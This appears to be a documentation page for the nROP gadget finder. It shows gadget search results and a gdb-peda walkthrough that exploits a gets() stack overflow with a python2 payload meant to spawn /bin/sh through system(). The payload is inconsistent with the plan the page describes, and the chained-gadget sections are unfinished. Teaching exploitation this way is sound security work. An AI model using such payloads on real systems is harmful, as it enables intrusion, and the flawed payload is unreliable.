---
title: nROP Examples
layout: base
---

[1]: http://crypto.stanford.edu/~blynn/rop/

# Gather gadgets

The simplest form of ga is two chains, as ROP chains, do the same thing.

A sample binary containing [optiROP](https://media.blackhat.com/us-13/US-13-Quynh-OptiROP-Hunting-for-ROP-Gadgets-in-Style-Slides.pdf) tricky chains is included in the [examples directory of the github repository](https://github.com/awailly/nrop/tree/master/examples). We will use this binary to underline different type of gadgets handled by nROP, and corresponding to the categories of gadgets identified by @aquynh.

## Natural gadgets

### PN1

The first category of gadgets sets a register to another register.

Command to launch:

    % ./packer -t 4889d8c3 examples/opti

Results

       [X] add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0xc3d88948 ; xchg rbx, rax ; ret  ;
       [X] add byte ptr [rdi], cl ; add eax, 0xc3d88948 ; xchg rbx, rax ; ret  ;
       [X] add eax, 0xc3d88948 ; xchg rbx, rax ; ret  ;
       [X] fadd st0, st3 ; xchg rbx, rax ; ret  ;
       [X] fadd st0, st3 ; xchg rcx, rbx ; xchg rcx, rax ; ret  ;
       [X] fadd st0, st3 ; xor rax, rax ; not rax ; and rax, rbx ; ret  ;
       [X] imul rax, rbx, 0x1 ; ret  ;
       [X] mov rax, rbx ; ret  ;
       [X] push rbx ; xor rax, rax ; pop rax ; ret  ;
       [X] rcr byte ptr [rsi+0x48], 0x1 ; fadd st0, st3 ; xor rax, rax ; not rax ; and rax, rbx ; ret  ;
       [X] ror byte ptr [rax+0x21], 0x1 ; fadd st0, st3 ; xchg rcx, rbx ; xchg rcx, rax ; ret  ;
       [X] xchg rbx, rax ; ret  ;
       [X] xchg rcx, rbx ; lea rax, ptr [rcx] ; ret  ;
       [X] xchg rcx, rbx ; xchg rcx, rax ; ret  ;
       [X] xor eax, eax ; add rax, rbx ; ret  ;
       [X] xor eax, eax ; not rax ; and rax, rbx ; ret  ;
       [X] xor rax, rax ; add rax, rbx ; ret  ;
       [X] xor rax, rax ; not rax ; and rax, rbx ; ret  ;

### PN2

The second category of gadgets sets a register to an immediate constant.

Command to launch:

    % ./packer -t 48c7c034120000c3 examples/opti

Results

       [X] push 0x1234 ; pop rax ; inc rbx ; ret  ;
       [X] push 0x1234 ; pop rbp ; xchg rbp, rax ; ret  ;
       [X] push 0xffffffffffffedcc ; pop rdx ; xor rax, rax ; sub rax, rdx ; ret  ;

### Stack overflow example

We take the first [google result for "rop exploit"][1] and use nrop to exploit it. The vulnerable code for this example is

    #include <stdio.h> 

    int main()
    {
        char name[64]; 
        printf("%p\n", name);  // Print address of buffer. 
        puts("What's your name?"); 
        gets(name); 
        printf("Hello, %s!\n", name); 
        return 0; 
    }

Then we compile and load the binary into gdb with [peda][https://github.com/longld/peda].

    % gcc bla.c -o bla
    % gdb -q --args bla
    Reading symbols from bla...(no debugging symbols found)...done.
    gdb-peda$ pattc 128 /tmp/bla
    Writing pattern of 128 chars to filename "/tmp/bla"
    gdb-peda$ r < /tmp/bla
    Starting program: /tmp/tmp.mysQza1R1X/bla < /tmp/bla
    0x7fffffffddb0
    What's your name?
    Hello, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AA...

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    RAX: 0x0 
    RBX: 0x0 
    RCX: 0x7fffff78 
    RDX: 0x7ffff7dd7970 --> 0x0 
    RSI: 0x7ffff7ff7000 ("Hello, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA...
    RDI: 0x0 
    RBP: 0x4141334141644141 ('AAdAA3AA')
    RSP: 0x7fffffffddf8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
    RIP: 0x4005e6 (<main+80>:       ret)
    R8 : 0x6941414d41413741 ('A7AAMAAi')
    R9 : 0x80 
    R10: 0x414f41413941416a ('jAA9AAOA')
    R11: 0x246 
    R12: 0x4004a0 (<_start>:        xor    ebp,ebp)
    R13: 0x7fffffffded0 --> 0x1 
    R14: 0x0 
    R15: 0x0
    EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x4005db <main+69>:  call   0x400460 <printf@plt>
       0x4005e0 <main+74>:  mov    eax,0x0
       0x4005e5 <main+79>:  leave  
    => 0x4005e6 <main+80>:  ret    
       0x4005e7:    nop    WORD PTR [rax+rax*1+0x0]
       0x4005f0 <__libc_csu_init>:  push   r15
       0x4005f2 <__libc_csu_init+2>:        push   r14
       0x4005f4 <__libc_csu_init+4>:        mov    r15d,edi
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffddf8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
    0008| 0x7fffffffde00 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
    0016| 0x7fffffffde08 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
    0024| 0x7fffffffde10 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA")
    0032| 0x7fffffffde18 ("A7AAMAAiAA8AANAAjAA9AAOA")
    0040| 0x7fffffffde20 ("AA8AANAAjAA9AAOA")
    0048| 0x7fffffffde28 ("jAA9AAOA")
    0056| 0x7fffffffde30 --> 0x400400 --> 0x6009f0 --> 0x7ffff7aa1940 (<gets>:      push   r12)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x00000000004005e6 in main ()

And we look for our pattern in memory

    gdb-peda$ patts
    Registers contain pattern buffer:
    R8+0 found at offset: 104
    R10+0 found at offset: 120
    RBP+0 found at offset: 64
    Registers point to pattern buffer:
    [RSP] --> offset 72 - size ~56
    Pattern buffer found at:
    0x00007ffff7ff6000 : offset    0 - size  128 (mapped)
    0x00007ffff7ff7007 : offset    0 - size  128 (mapped)
    0x00007fffffffdd18 : offset   88 - size    8 ($sp + -0xe0 [-56 dwords])
    0x00007fffffffddb0 : offset    0 - size  128 ($sp + -0x48 [-18 dwords])
    References to pattern buffer found at:
    0x00007ffff7dd5988 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)
    0x00007ffff7dd5990 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)
    0x00007ffff7dd5998 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)
    0x00007ffff7dd59a0 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)
    0x00007ffff7dd59a8 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)
    0x00007ffff7dd59b0 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)
    0x00007ffff7dd59b8 : 0x00007ffff7ff6000 (/usr/lib/libc-2.21.so)
    0x00007fffffffd870 : 0x00007fffffffddb0 ($sp + -0x588 [-354 dwords])
    0x00007fffffffdce0 : 0x00007fffffffddb0 ($sp + -0x118 [-70 dwords])
    0x00007fffffffdcf8 : 0x00007fffffffddb0 ($sp + -0x100 [-64 dwords])
    0x00007fffffffdd60 : 0x00007fffffffddb0 ($sp + -0x98 [-38 dwords])

The current memory layout is

    gdb-peda$ vmmap
    Start              End                Perm      Name
    0x00400000         0x00401000         r-xp      /tmp/tmp.mysQza1R1X/bla
    0x00600000         0x00601000         rw-p      /tmp/tmp.mysQza1R1X/bla
    0x00007ffff7a38000 0x00007ffff7bd1000 r-xp      /usr/lib/libc-2.21.so
    0x00007ffff7bd1000 0x00007ffff7dd1000 ---p      /usr/lib/libc-2.21.so
    0x00007ffff7dd1000 0x00007ffff7dd5000 r--p      /usr/lib/libc-2.21.so
    0x00007ffff7dd5000 0x00007ffff7dd7000 rw-p      /usr/lib/libc-2.21.so
    0x00007ffff7dd7000 0x00007ffff7ddb000 rw-p      mapped
    0x00007ffff7ddb000 0x00007ffff7dfd000 r-xp      /usr/lib/ld-2.21.so
    0x00007ffff7fca000 0x00007ffff7fcd000 rw-p      mapped
    0x00007ffff7ff6000 0x00007ffff7ff8000 rw-p      mapped
    0x00007ffff7ff8000 0x00007ffff7ffa000 r--p      [vvar]
    0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp      [vdso]
    0x00007ffff7ffc000 0x00007ffff7ffd000 r--p      /usr/lib/ld-2.21.so
    0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p      /usr/lib/ld-2.21.so
    0x00007ffff7ffe000 0x00007ffff7fff000 rw-p      mapped
    0x00007ffffffde000 0x00007ffffffff000 rw-p      [stack]
    0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]

We will exploit with a conventional call to the system() function into libc with */bin/sh* as the first argument, here into the *RDI* register. The target for our exploit is

    rdi = &"/bin/sh"
    rip = &system@libc

The */bin/sh* string can be written on the stack directly and the address pop'd. Our first guess is with the freshly created binary

    % ~/Outils/nrop/nrop/packer -t 5fc3 /tmp/tmp.mysQza1R1X/bla
    Found Entry @4004a0
    000000: \x5f\xc3                                           _.
    000000: \xc3                                              .
       [00400653] pop rdi ; ret  ;

Then we grab the system@libc address, by adjusting a got address with the offset of *system* in the libc (to somehow bypass ASLR)

    gdb-peda$ p puts
    $1 = {<text variable, no debug info>} 0x7ffff7aa21e0 <puts>
    gdb-peda$ p system
    $2 = {<text variable, no debug info>} 0x7ffff7a777e0 <system>
    gdb-peda$ p $1 - $2
    $3 = 0x2aa00

We want to write *&system* at *0x6009d0* and set eip to *0x400450*

    gdb-peda$ disassemble 
    Dump of assembler code for function main:
       0x0000000000400596 <+0>:     push   rbp
       0x0000000000400597 <+1>:     mov    rbp,rsp
       0x000000000040059a <+4>:     sub    rsp,0x40
       0x000000000040059e <+8>:     lea    rax,[rbp-0x40]
       0x00000000004005a2 <+12>:    mov    rsi,rax
       0x00000000004005a5 <+15>:    mov    edi,0x400674
       0x00000000004005aa <+20>:    mov    eax,0x0
       0x00000000004005af <+25>:    call   0x400460 <printf@plt>
       0x00000000004005b4 <+30>:    mov    edi,0x400678
       0x00000000004005b9 <+35>:    call   0x400450 <puts@plt>
       0x00000000004005be <+40>:    lea    rax,[rbp-0x40]
       0x00000000004005c2 <+44>:    mov    rdi,rax
       0x00000000004005c5 <+47>:    call   0x400490 <gets@plt>
       0x00000000004005ca <+52>:    lea    rax,[rbp-0x40]
       0x00000000004005ce <+56>:    mov    rsi,rax
       0x00000000004005d1 <+59>:    mov    edi,0x40068a
       0x00000000004005d6 <+64>:    mov    eax,0x0
       0x00000000004005db <+69>:    call   0x400460 <printf@plt>
       0x00000000004005e0 <+74>:    mov    eax,0x0
       0x00000000004005e5 <+79>:    leave  
    => 0x00000000004005e6 <+80>:    ret    
    End of assembler dump.
    gdb-peda$ disassemble 0x400450
    Dump of assembler code for function puts@plt:
       0x0000000000400450 <+0>:     jmp    QWORD PTR [rip+0x20057a]        # 0x6009d0 <puts@got.plt>
       0x0000000000400456 <+6>:     push   0x0
       0x000000000040045b <+11>:    jmp    0x400440
    End of assembler dump.
    gdb-peda$ disassemble 0x6009d0
    Dump of assembler code for function puts@got.plt:
       0x00000000006009d0 <+0>:     loopne 0x6009f3 <gets@got.plt+3>
       0x00000000006009d2 <+2>:     stos   BYTE PTR es:[rdi],al
       0x00000000006009d3 <+3>:     idiv   edi
       0x00000000006009d5 <+5>:     jg     0x6009d7 <puts@got.plt+7>
       0x00000000006009d7 <+7>:     add    BYTE PTR [rax-0x85790],ah
    End of assembler dump.
    gdb-peda$ x/xg 0x6009d0
    0x6009d0 <puts@got.plt>:        0x00007ffff7aa21e0

Our exploit is in the pseudo form

    "A"*72 + pop rdi + "/bin/sh" + ([0x6009d0] += 0x2aa00) + ret(0x400450

Weaponized in python with

    python2 -c 'print "A"*72 + "\x53\x06\x40\x00\x00\x00\x00\x00" + "hs//bin/" + "\xe0\x77\xa7\xf7\xff\x7f\x00\x00"' > /tmp/bla
    gdb -q ./bla

## Chained gadgets

Support coming :)

### PC1

This category of gadgets is close to PN1, setting register to another, but with the help of gadget chaining.

### PC2

This category of gadgets is close to PN2, setting register to another, but with the help of gadget chaining.

### PC3

This category of gadgets is close to PN3, setting register to another, but with the help of gadget chaining.

